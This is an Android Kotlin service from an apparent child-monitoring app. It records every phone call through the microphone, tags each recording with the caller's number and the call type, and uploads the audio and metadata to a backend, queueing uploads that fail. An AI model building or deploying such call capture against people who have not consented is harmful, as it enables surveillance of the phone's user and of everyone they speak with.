package com.udaan.child

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.io.File

class CallRecorderService : Service() {

    private var telephonyManager: TelephonyManager? = null
    private var legacyListener: PhoneStateListener? = null
    private var modernCallback: TelephonyCallback? = null

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentCallType = "UNKNOWN"
    private var callStartTime = 0L
    private var lastRecordedPhone = "unknown"
    private var wakeLock: PowerManager.WakeLock? = null

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        const val CHANNEL_ID = "udaan_child_recorder"
        private const val NOTIFICATION_ID = 101
        private const val TAG = "CallRecorderService"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        registerPhoneStateListener()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Call Recorder Active")
            .setContentText("Monitoring voice activity")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        return START_STICKY
    }

    private fun registerPhoneStateListener() {
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Android 12+ API
            modernCallback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                override fun onCallStateChanged(state: Int) {
                    handleCallState(state, null)
                }
            }
            modernCallback?.let {
                telephonyManager?.registerTelephonyCallback(mainExecutor, it)
            }
        } else {
            // Android 11 aur neeche
            @Suppress("DEPRECATION")
            legacyListener = object : PhoneStateListener() {
                @Deprecated("Deprecated in Java")
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    handleCallState(state, phoneNumber)
                }
            }
            @Suppress("DEPRECATION")
            telephonyManager?.registerListener(legacyListener, PhoneStateListener.LISTEN_CALL_STATE)
        }
    }

    private fun handleCallState(state: Int, phoneNumber: String?) {
        when (state) {
            TelephonyManager.CALL_STATE_RINGING -> {
                currentCallType = "INCOMING"
                if (!phoneNumber.isNullOrBlank()) {
                    lastRecordedPhone = phoneNumber
                }
            }
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                if (currentCallType != "INCOMING") {
                    currentCallType = "OUTGOING"
                }
                callStartTime = System.currentTimeMillis()
                startRecording(if (!phoneNumber.isNullOrBlank()) phoneNumber else lastRecordedPhone)
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (isRecording) {
                    stopRecording()
                }
                currentCallType = "UNKNOWN"
            }
        }
    }

    private fun startRecording(phone: String) {
        if (isRecording) return
        lastRecordedPhone = phone

        try {
            val dir = File(filesDir, "recordings")
            if (!dir.exists()) dir.mkdirs()

            val file = File(dir, "call_${phone}_${System.currentTimeMillis()}.m4a")

            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }).apply {
                setAudioSource(MediaRecorder.AudioSource.MIC) // VOICE_COMMUNICATION ya MIC
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(64000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            Log.d(TAG, "Recording started for: $phone")
        } catch (e: Exception) {
            Log.e(TAG, "startRecording failed", e)
            mediaRecorder?.reset()
            mediaRecorder = null
            isRecording = false
        }
    }

    private fun stopRecording() {
        if (!isRecording) return
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (e: Exception) {
            Log.e(TAG, "stop failed", e)
        } finally {
            mediaRecorder = null
            isRecording = false
        }

        val duration = (System.currentTimeMillis() - callStartTime) / 1000
        Log.d(TAG, "Recording stopped. Duration: ${duration}s")

        val dir = File(filesDir, "recordings")
        val latest = dir.listFiles()?.maxByOrNull { it.lastModified() }

        if (latest != null) {
            serviceScope.launch {
                val success = UploadManager.uploadRecording(
                    file = latest,
                    deviceId = "practice_device",
                    phoneNumber = lastRecordedPhone,
                    callType = currentCallType,
                    duration = duration,
                    timestamp = callStartTime
                )
                if (!success) {
                    DatabaseHelper.addToQueue(
                        type = "recording",
                        filePath = latest.absolutePath,
                        jsonData = "{\"phone\":\"$lastRecordedPhone\",\"type\":\"$currentCallType\",\"duration\":$duration}",
                        timestamp = callStartTime
                    )
                }
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Call Recorder Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "udaan:recorder").apply {
            acquire(10 * 60 * 1000L) // 10 min safe timeout
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
    }

    private fun unregisterPhoneStateListener() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            modernCallback?.let { telephonyManager?.unregisterTelephonyCallback(it) }
            modernCallback = null
        } else {
            @Suppress("DEPRECATION")
            legacyListener?.let { telephonyManager?.listen(it, PhoneStateListener.LISTEN_NONE) }
            legacyListener = null
        }
    }

    override fun onDestroy() {
        unregisterPhoneStateListener()
        if (isRecording) stopRecording()
        releaseWakeLock()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

